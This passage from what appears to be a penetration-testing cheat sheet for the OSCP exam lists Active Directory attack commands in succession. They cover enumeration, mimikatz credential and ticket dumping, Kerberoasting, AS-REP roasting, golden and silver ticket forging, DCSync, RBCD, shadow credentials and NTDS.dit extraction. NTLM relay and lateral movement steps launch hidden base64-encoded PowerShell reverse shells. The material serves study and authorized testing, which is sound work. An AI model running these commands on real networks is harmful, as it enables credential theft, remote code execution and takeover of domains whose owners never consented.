&lt;wordlist&gt;\n</code></pre>"},{"location":"18_ad_enum/#netexec","title":"NetExec","text":"<pre><code># users, groups and all\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --users\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --groups\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --loggedon-users\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --all\n\n# find auto login credentials\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -M gpp_autologin\n\n# shares\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --shares\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -M spider_plus --share '&lt;sharename&gt;'\n\n# dump lsa or ntds\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --lsa\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --ntds\n\n# execute a command\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &lt;command&gt;\n\n# PTH\nnxc smb &lt;ip&gt; -u &lt;user&gt; -H &lt;hash&gt; \n</code></pre>"},{"location":"18_ad_enum/#gpp-password-in-sysvol-policy","title":"GPP password in SYSVOL policy","text":"<pre><code># manual\ngrep -inr \"cpassword\" . --include=*.xml\n\n# GPPPassword\n# with NULL session\nimpacket-Get-GPPPassword -no-pass &lt;ip&gt;\n# with creds\nimpacket-Get-GPPPassword &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt;\n# parse a local file\nimpacket-Get-GPPPassword -xmlfile &lt;Policy&gt;.xml local\n\n# nxc\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -M gpp_password\n</code></pre> <p>Decrypt the password</p> <pre><code>gpp-decrypt &lt;pass&gt;\n</code></pre>"},{"location":"18_ad_enum/#windows","title":"Windows","text":""},{"location":"18_ad_enum/#living-off-the-land","title":"Living off the Land","text":"<pre><code># list domain users\nnet user /domain\nnet user /domain &lt;username&gt;\n# list domain groups\nnet group /domain\nnet group /domain &lt;groupname&gt;\n\n# add user to group\nnet group &lt;groupname&gt; &lt;username&gt; /add /domain\n\n# list computers\nnet view\n\n# check current shares\nnet share\n# list a share\nls \\\\dc1.corp.com\\sysvol\\corp.com\\\n# all shares on the domain\nnet view /all /domain[:domainname]\n\n# password policy\nnet accounts /domain\n\n# check logged users\nqwinsta\n\n# get current domain name\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n# check firewall\nnetsh advfirewall show allprofiles\n\n# PowerShell\n# list modules\nGet-Module\nGet-ExecutionPolicy -List\n# change the policy for the current session\nSet-ExecutionPolicy Bypass -Scope Process\n# env values\nGet-ChildItem Env: | ft Key,Value\n# get user's history\nGet-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\n\n# check windows defender\nsc query windefend\nGet-MpComputerStatus\n</code></pre>"},{"location":"18_ad_enum/#security-controls","title":"Security Controls","text":"<pre><code># Windows Defender\nGet-MpComputerStatus\n\n# AppLocker\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\n# PowerShell language mode\n$ExecutionContext.SessionState.LanguageMode\n\n# LAPS\nFind-LAPSDelegatedGroups\nFind-AdmPwdExtendedRights\nGet-LAPSComputers\n</code></pre>"},{"location":"18_ad_enum/#active-directory-module","title":"Active Directory Module","text":"<pre><code>Import-Module ActiveDirectory\n\n# basic info\nGet-ADDomain\n# get users and groups\nGet-ADUser\nGet-ADGroup\nGet-ADGroupMember -Identity \"&lt;group name&gt;\"\n</code></pre>"},{"location":"18_ad_enum/#powerview","title":"PowerView","text":"<p>PowerView</p> <p>SharpView</p> <pre><code># if scripts cannot be imported\npowershell -ep bypass\nImport-Module .\\PowerView.ps1\n\n# domain info\nGet-NetDomain\n# list users\nGet-NetUser\nGet-NetUser -Identity &lt;username&gt;\nGet-NetUser | select cn\nGet-NetUser &lt;usercn&gt;\n# list groups\nGet-NetGroup\nGet-NetGroup | select cn\nGet-NetGroup &lt;groupcn&gt; | select member\n# recurseive group membership\nGet-DomainGruoupMember -Identity \"Domain Admins\" -Recurse\n# list computers\nGet-NetComputer\nGet-NetComputer | select operatingsystem,dnshostname\n\n# find local admin access for the current user\nFind-LocalAdminAccess\n# see who is logged on\nGet-NetSession -ComputerName &lt;computer&gt;\n# if it fails, use psloggedon.exe; needs Remote Registry active on host\nPsLoggedon.exe \\\\&lt;computer&gt;\n\n# list SPNs\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\n# or\nsetspn -L iis_service\n# list Access Control Entries (ACE) of user\nGet-ObjectAcl -Identity &lt;user&gt;\n# convert SID to name\nConvert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104\n\n# filter by perm GenericAll for a specific group\nGet-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights\n\n# find AS-REP Roastable accounts\nGet-DomainUser -PreauthNotRequired -verbose\n# find kerberoastable accounts\nGet-NetUser -SPN | select serviceprincipalname\n\n# find shares\nFind-DomainShare\n\n# test admin access\nTest-AdminAccess -ComputerName &lt;name&gt;\n</code></pre>"},{"location":"18_ad_enum/#wmi","title":"WMI","text":"<pre><code># patch level and description of the Hotfixes applied\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n# displays basic host information to include any attributes within the list\nwmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List\n# list all processes on host\nwmic process list /format:list\n# Domain and Domain Controllers\nwmic ntdomain list /format:list\n# all local accounts and any domain accounts that have logged into the device\nwmic useraccount list /format:list\n# all local groups\nwmic group list /format:list\n# system accounts that are being used as service accounts\nwmic sysaccount list /format:list\n</code></pre>"},{"location":"18_ad_enum/#snaffler","title":"Snaffler","text":"<p>Finds credentials in the AD environment.</p> <p>https://github.com/SnaffCon/Snaffler</p> <pre><code>Snaffler.exe -s -d &lt;domain&gt; -o snaffler.log -v data\n</code></pre>"},{"location":"18_ad_enum/#bloodhound","title":"BloodHound","text":"<p>Installation</p> <pre><code># first time start\n./bloodhound-cli install\n# reset password\n./bloodhound-cli resetpwd\n# restart containers\n./bloodhound-cli containers restart\n# stop containers\n./bloodhound-cli containers stop\n\n# legacy\nsudo neo4j start\nbloodhound\n</code></pre>"},{"location":"18_ad_enum/#sharphound","title":"SharpHound","text":"<p>Warning</p> <p>For BloodHound legacy (4.3.1) compatibility, use SharpHound v1.1.1.1</p> <p>https://github.com/SpecterOps/SharpHound</p> <pre><code>.\\SharpHound.exe -c All\n\nImport-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix \"dom audit\"\n</code></pre>"},{"location":"18_ad_enum/#bloodhound-ce-python","title":"bloodhound-ce-python","text":"<p><code>pipx install bloodhound-ce</code></p> <pre><code>bloodhound-ce-python -c All -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -dc &lt;dc_hostname&gt; -ns &lt;ns_ip&gt; --zip \n\n# legacy\nbloodhound-python -c All -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -dc &lt;dc_hostname&gt; -ns &lt;ns_ip&gt; --zip \n</code></pre>"},{"location":"18_ad_enum/#ldapdomaindump","title":"LDAPDomainDump","text":"<pre><code>ldapdomaindump -u '&lt;domain&gt;\\&lt;user&gt;' -p '&lt;pass&gt;' &lt;ip&gt;\n</code></pre>"},{"location":"18_ad_enum/#automated-enumeration","title":"Automated Enumeration","text":""},{"location":"18_ad_enum/#adpeas","title":"ADpeas","text":"<p>https://github.com/61106960/adPEAS</p> <pre><code>Import-Module .\\adPEAS.ps1\nInvoke-adPEAS\n</code></pre>"},{"location":"19_ad_exploitation/","title":"\u2694\ufe0f AD Exploitation","text":""},{"location":"19_ad_exploitation/#basic-kerberos-authentication","title":"Basic Kerberos Authentication","text":"<pre><code>sequenceDiagram\n    participant C as Client\n    participant AS as Authentication Server\n    participant TGS as Ticket Granting Server\n    participant S as Service\n\n    C-&gt;&gt;AS: AS-REQ (with credentials)\n    AS--&gt;&gt;C: AS-REP (TGT, Session Key for TGS)\n    Note right of C: Stores TGT and session key to talk with TGS\n\n    C-&gt;&gt;TGS: TGS-REQ (TGT, Authenticator, SPN of Service)\n    TGS--&gt;&gt;C: TGS-REP (Service Ticket, Session Key for Service)\n    Note right of C: Now has a ticket &amp; session key to talk with Service\n\n    C-&gt;&gt;S: AP-REQ (Service Ticket, Authenticator)</code></pre>"},{"location":"19_ad_exploitation/#dumping-cached-ad-credentials","title":"Dumping Cached AD Credentials","text":"<p>Info</p> <p>SYSTEM privileges are needed</p> <pre><code># linux\nimpacket-secretsdump -target-ip &lt;target_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target_ip&gt;\n\n# win\n.\\mimikatz.exe\nprivilege::debug\n\n# dump cached NTLM hashes on the current system\nsekurlsa::logonpasswords\n\n# dump tickets\nsekurlsa::tickets\n\n# one-liner\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n</code></pre>"},{"location":"19_ad_exploitation/#as-rep-roasting","title":"AS-REP Roasting","text":"<p>Attack that exploits accounts with Do not require Kerberos preauthentication enabled to obtain and crack TGTs offline, revealing the user's NTLM hash.</p> <pre><code>sequenceDiagram\n    participant Attacker\n    participant KDC\n\n    Attacker-&gt;&gt;KDC: AS-REQ (Username, \"Pre-Authentication Not Required\")\n    activate KDC\n    KDC--&gt;&gt;Attacker: AS-REP (TGT encrypted with user's NTLM hash)\n    deactivate KDC\n\n    Attacker-&gt;&gt;Attacker: Offline Cracking (Attempt to crack TGT to reveal NTLM hash)</code></pre> <p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 18200</p> <pre><code># linux\nimpacket-GetNPUsers &lt;domain&gt;/ -dc-ip &lt;ip&gt; -request -no-pass -usersfile &lt;valid_users&gt;\nkerbrute userenum -d &lt;domain&gt; --dc &lt;ip&gt; &lt;valid_users&gt;\n\n# windows\n.\\Rubeus.exe asreproast /nowrap\n</code></pre>"},{"location":"19_ad_exploitation/#kerberoasting","title":"Kerberoasting","text":"<p>Attack that targets service accounts by requesting service tickets for their SPNs, to then crack them to get the service account's password.</p> <pre><code>sequenceDiagram\n    participant Attacker\n    participant KDC\n    participant Service\n\n    Attacker-&gt;&gt;KDC: AS_REQ (Valid User Credentials)\n    activate KDC\n    KDC--&gt;&gt;Attacker: AS_REP (TGT)\n    deactivate KDC\n\n    Attacker-&gt;&gt;KDC: TGS_REQ (TGT, SPN of target service)\n    activate KDC\n    KDC--&gt;&gt;Attacker: TGS_REP (Service Ticket encrypted with service account's password)\n    deactivate KDC\n\n    Attacker-&gt;&gt;Attacker: Offline Cracking (Attempt to crack service ticket)\n\n    Attacker-&gt;&gt;Service: AP_REQ (Service Ticket, Authenticator)\n    activate Service\n    Service--&gt;&gt;Attacker: Access Granted\n    deactivate Service</code></pre> <p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 13100</p> <pre><code># sync local time with server if error\nntpdate &lt;dc_ip&gt;\n\nimpacket-GetUserSPNs -request -dc-ip &lt;ip&gt; &lt;domain&gt;/&lt;user&gt;\n\n# windows\n.\\Rubeus.exe kerberoast /simple\n</code></pre>"},{"location":"19_ad_exploitation/#targetedkerberoast","title":"TargetedKerberoast","text":"<p>This tool tries to set SPNs on users without one abusing write permission (like GenericWrite) on the <code>servicePrincipalName</code> attribute.</p> <p>https://github.com/ShutdownRepo/targetedKerberoast</p> <pre><code>targetkerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --request-user &lt;target_user&gt;\n</code></pre>"},{"location":"19_ad_exploitation/#silver-ticket","title":"Silver Ticket","text":"<p>Is a forged Kerberos Ticket Granting Service (TGS) ticket that allows an attacker to gain unauthorized access to a specific service, bypassing the need to request a ticket from the Key Distribution Center (KDC) after initial authentication.</p> <pre><code>sequenceDiagram\n    participant Attacker\n    participant Target Service\n\n    Attacker-&gt;&gt;Attacker: Extracts NTLM hash of Service Account\n    Attacker-&gt;&gt;Attacker: Creates forged TGS (Silver Ticket)\n    Attacker-&gt;&gt;Target Service: Forged AP-REQ (Sends forged TGS to access service)\n    Target Service--&gt;&gt;Attacker: AP-REP (Grants unauthorized access)</code></pre> <p>Three pieces of info are needed:</p> <ul> <li>SPN password hash</li> <li>Domain SID</li> <li>Target SPN</li> </ul> <p>Windows</p> <pre><code># windows \n# SPN hash\n.\\mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\n\n# domain SID\nwhoami /user\n# take everything except the last part; only the domain SID, not the user RID\n\n# target SPN\nsetspn -L &lt;account_name&gt;\n\n# forge the ticket\nkerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin\nexit\n\n# show saved tickets\nklist\n\n# access the service\niwr -UseDefaultCredentials &lt;servicename&gt;://&lt;computername&gt;\n</code></pre> <p>Linux</p> <pre><code># SPN hash\necho -n 'password' | iconv -t utf16le | openssl dgst -md4\n\n# domain SID\nimpacket-getPac &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -targetUser Administrator\n\n# target SPN (shows up after GetUserSPNs)\n\n# forge the ticket\nimpacket-ticketer -nthash &lt;hash&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; -spn &lt;spn&gt; &lt;user&gt;\n\n# export the ticket\nexport KRB5CCNAME=&lt;ticket&gt;.ccache\n\n# show saved tickets\nklist\n\n# access the target\nimpacket-psexec &lt;domain&gt;/&lt;user&gt;@&lt;target&gt; -k -no-pass\n</code></pre>"},{"location":"19_ad_exploitation/#dcsync","title":"DCSync","text":"<p>Is an attack that allows an attacker with sufficient privileges to request password hashes and other sensitive information directly from a domain controller, effectively mimicking the behavior of a legitimate domain controller replicating data.</p> <p>The user needs the following permissions or must belong to a privileged group:</p> <ul> <li>Replicating Directory Changes</li> <li>Replicating Directory Changes All</li> <li>Replicating Directory Changes in Filtered Set</li> </ul> <p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 1000</p> <pre><code># linux\nimpacket-secretsdump -just-dc-user &lt;target_user&gt; &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;dc_ip&gt;\n\n# windows\n.\\mimikatz.exe\nlsadump::dcsync /user:&lt;domain\\user&gt;\n\n# one-liner\n.\\mimikatz.exe \"lsadump::dcsync /user:&lt;domain&gt;\\&lt;user&gt;\" \"exit\"\n</code></pre>"},{"location":"19_ad_exploitation/#rbcd-resource-based-constrained-delegation","title":"RBCD (Resource-Based Constrained Delegation)","text":"<p>A Resource-Based Constrained Delegation allows an attacker with write access to a computer object's delegation attribute to impersonate any user on that computer, enabling privilege escalation or lateral movement.</p> <p>https://github.com/tothi/rbcd-attack (From outside of the domain)</p> <pre><code># Create a new computer\nimpacket-addcomputer &lt;domain&gt;/&lt;user&gt; -computer-name 'evilcomputer$' -computer-pass 'ev1lP@sS' -dc-ip &lt;ip&gt; -hashes :&lt;hash&gt;\n\n# Add the related security descriptor of the newly created EVILCOMPUTER to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target computer\npython rbcd.py -f EVILCOMPUTER -t &lt;computer&gt; -dc-ip &lt;ip&gt; &lt;domain&gt;\\&lt;user&gt; -hashes :&lt;hash&gt;\npython rbcd.py -f EVILCOMPUTER -t &lt;computer&gt; -dc-ip &lt;ip&gt; '&lt;domain&gt;\\&lt;user&gt;:&lt;password&gt;'\n\n# Fetch a CIFS Service Ticket on behalf of the targeted domain user admin and store it in the file admin.ccache\nimpacket-getST -spn cifs/&lt;computer&gt;.&lt;domain&gt; -impersonate administrator -dc-ip &lt;ip&gt; &lt;domain&gt;/EVILCOMPUTER$:ev1lP@sS\n</code></pre> <p>Export the ticket and access the computer as administrator</p> <pre><code>export KRB5CCNAME=administrator@cifs_&lt;computer&gt;.&lt;domain&gt;@&lt;DOMAIN&gt;.ccache\n\nimpacket-psexec -k &lt;computer&gt;.&lt;domain&gt;\n</code></pre>"},{"location":"19_ad_exploitation/#shadow-credentials","title":"Shadow Credentials","text":"<p>Shadow credentials abuse involves adding a malicious certificate to a user or computer object, allowing attackers to authenticate as that principal using PKINIT (Kerberos certificate authentication).</p> <p>Requirements:</p> <ul> <li>The Domain Controller must have a server authentication digital certificate installed.</li> <li>Write access to <code>msDS-KeyCredentialLink</code> attribute on the target object.</li> </ul> <p>https://github.com/ShutdownRepo/pyWhisker</p> <pre><code># Add a shadow credential to the target user/computer\npython pywhisker.py --action add -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --target &lt;target_user&gt; --filename &lt;cert_name&gt;\n\n# Request a TGT using the shadow credential\npython gettgtpkinit.py -cert-pfx &lt;cert_name.pfx&gt; -pfx-pass &lt;pass&gt; &lt;domain&gt;/&lt;user&gt; &lt;user&gt;.ccache\n\n# Export the ticket for use with other tools\nexport KRB5CCNAME=&lt;ticket&gt;.ccache\n\n# Get users's NTLM hash\npython getnthash.py -key &lt;key&gt; &lt;domain&gt;/&lt;user&gt;\n</code></pre>"},{"location":"19_ad_exploitation/#cves-and-exploits","title":"CVEs and Exploits","text":"<ul> <li>CVE-2020-1472 - Zerologon</li> <li>MS14-068 - Golden Pac <code>impacket-goldenPac</code></li> <li>CVE-2021-42278 and CVE-2021-42287 - noPac</li> </ul>"},{"location":"20_ad_lateral_mov/","title":"\ud83c\udff9 AD Lateral Movement","text":""},{"location":"20_ad_lateral_mov/#winrs","title":"Winrs","text":"<pre><code># add the base64-encoded PowerShell reverse shell\nwinrs -r:files04 -u:jen -p:Nexus123!  \"powershell -nop -w hidden -e &lt;encoded_rs&gt;\"\n</code></pre>"},{"location":"20_ad_lateral_mov/#psexecexe","title":"PsExec.exe","text":"<p>Requirements:</p> <ul> <li>The user that authenticates to the target machine needs to be part of the Administrators local group.</li> <li>The ADMIN$ share must be available (enabled by default).</li> <li>File and printer sharing has to be turned on (on by default)</li> </ul> <pre><code>./PsExec64.exe -i \\\\FILES04 -u corp\\jen -p Nexus123! cmd\n</code></pre>"},{"location":"20_ad_lateral_mov/#evil-winrm","title":"Evil-Winrm","text":"<pre><code># using password\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -S\n# using hash\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;\n# using key\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -c cert.pem -k key.pem -S\n\n# once connected, upload or download files\nupload &lt;file&gt;\ndownload &lt;file&gt;\n\n# load PS scripts on connect\nevil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -s &lt;script.ps1&gt;\n</code></pre>"},{"location":"20_ad_lateral_mov/#impacket-execs","title":"Impacket-*execs","text":"<p>Requirements:</p> <ul> <li>An SMB connection through the firewall (commonly port 445).</li> <li>The Windows File and Printer Sharing feature must be enabled.</li> <li>The admin share called ADMIN$ must be available.</li> </ul> <pre><code># psexec\nimpacket-psexec -hashes &lt;hash:hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;command&gt; \n# smbexec\nimpacket-smbexec -hashes &lt;hash:hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;command&gt; \n# wmiexec\nimpacket-wmiexec -hashes &lt;hash:hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;command&gt; \n# atexec\nimpacket-atexec -hashes &lt;hash:hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;command&gt;\n\n# if you only have the NTLM hash portion, use :&lt;ntlm_hash&gt;\n</code></pre>"},{"location":"20_ad_lateral_mov/#overpass-the-hash","title":"Overpass the Hash","text":"<p>When you have NTLM hashes but need Kerberos access.</p> <pre><code># get hashes with mimikatz\nprivilege::debug\nsekurlsa::logonpasswords\n# generate Kerberos ticket\nsekurlsa::pth /user:Administrator /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;\n# verify Kerberos ticket\nklist\n\n# access the resource\ndir \\\\&lt;target&gt;\\C$\n\n# linux\nimpacket-getTGT &lt;domain&gt;/&lt;user&gt; -hashes \":&lt;hash&gt;\"\nexport KRB5CCNAME=&lt;ticket&gt;.ccache\n\n# access the machine\nimpacket-psexec &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -k -no-pass\n</code></pre>"},{"location":"20_ad_lateral_mov/#pass-the-ticket","title":"Pass the Ticket","text":"<p>When you have Kerberos tickets but not the NTLM hash.</p> <pre><code># export tickets with mimikatz\nprivilege::debug\nsekurlsa::tickets /export\n# import it as the current user\nkerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-&lt;rhost&gt;.LOCAL.kirbi\n# verify Kerberos ticket\nklist\n\n# access the resource\ndir \\\\&lt;target&gt;\\admin$\n</code></pre>"},{"location":"20_ad_lateral_mov/#dcom","title":"DCOM","text":"<pre><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.50.73\"))\n\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n\n$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGU...\nAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\",\"7\")\n</code></pre>"},{"location":"20_ad_lateral_mov/#golden-ticket","title":"Golden Ticket","text":"<p>Is a forged Kerberos Ticket Granting Ticket (TGT) that allows an attacker to gain complete control of the Active Directory domain because it grants them the ability to request tickets for any service.</p> <pre><code>sequenceDiagram\n    participant A as Attacker\n    participant KDC as KDC\n    participant S as Service\n\n    Note over A: Attacker obtains KRBTGT key (offline)\n    A-&gt;&gt;A: Forge Golden Ticket (TGT) with custom claims\n    A-&gt;&gt;KDC: TGS-REQ (with forged TGT)\n    KDC--&gt;&gt;A: TGS-REP (service ticket)\n    A-&gt;&gt;S: AP-REQ (with forged service ticket and authenticator)\n    S--&gt;&gt;A: AP-REP (access granted)</code></pre> <pre><code># Windows\n# delete existing tickets\nkerberos::purge\n\n# get domain SID\nwhoami /user\n\n# forge the ticket\nkerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt\n\n# spawn a cmd as the new user\nmisc::cmd\n# or launch psexec.exe\nPsExec.exe \\\\dc1 cmd.exe\n\n# Linux\nimpacket-ticketer -aesKey &lt;key&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; -extra-sid &lt;parent_sid&gt; &lt;user&gt; -extra-pac\n\n# import the TGT\nexport KRB5CCNAME=&lt;user&gt;.ccache\n\n# access the machine\nimpacket-psexec -k -no-pass &lt;domain&gt;/&lt;username&gt;@&lt;hostname&gt;.&lt;domain&gt;\n</code></pre> <p>To get the parent domain (if needed), use it in <code>-extra-sid</code>:</p> <pre><code>.\\mimikatz.exe \"lsadump::trust /patch\" \"exit\"\n</code></pre>"},{"location":"20_ad_lateral_mov/#shadow-copies","title":"Shadow Copies","text":"<p>Requirements:</p> <ul> <li>Admins or SYSTEM privs</li> <li>Access to a DC (ntds.dit is only on DC)</li> <li>Regular user with SeBackupPrivilege (Can use robocopy to get the file from the copy)</li> </ul>"},{"location":"20_ad_lateral_mov/#vshadow","title":"vshadow","text":"<pre><code># execute vshadow and look for the path\nvshadow.exe -nw -p C:\n# copy from the path\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak\n# get system\nreg.exe save hklm\\system c:\\system.bak\n# use secretsdump to get the hashes\nimpacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\n</code></pre>"},{"location":"20_ad_lateral_mov/#diskshadow","title":"diskshadow","text":"<p>First, set up a shadowcopy.txt instructions file in which you create a volume with an alias as seen here:</p> <pre><code>set context persistent nowriters\nadd volume c: alias hack\ncreate\nexpose %hack% z:\n</code></pre> <p>Upload the file and execute <code>diskshadow</code></p> <pre><code># execute diskshadow using the file\ndiskshadow.exe /s .\\test.txt\n# copy or use robocopy if regular user witn backup perms\nrobocopy /b z:\\Windows\\NTDS\\ . ntds.dit \n# get system\nreg save HKLM\\system system\n# use secretsdump to get the hashes\nimpacket-secretsdump -ntds ntds.dit -system system LOCAL\n</code></pre>"},{"location":"20_ad_lateral_mov/#ntlm-relay","title":"NTLM Relay","text":"<p>Poisoning and Spoofing is not allowed on the OSCP exam</p> <p>Info</p> <p>SMB signing on the target system must be disabled</p> <pre><code># check whether the SMB signing is enabled on the target system\nnxc smb &lt;target_host&gt;\n\n# capture and forward the request to target host and execute a command on it\nimpacket-ntlmrelayx --no-http-server -smb2support -t &lt;target_host&gt; -c \"powershell -enc JABjAGwAa...AYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\"\n\n# dump target hashes without executing command\nimpacket-ntlmrelayx --no-http-server -smb2support -t &lt;target_host&gt;\n</code></pre>"}]}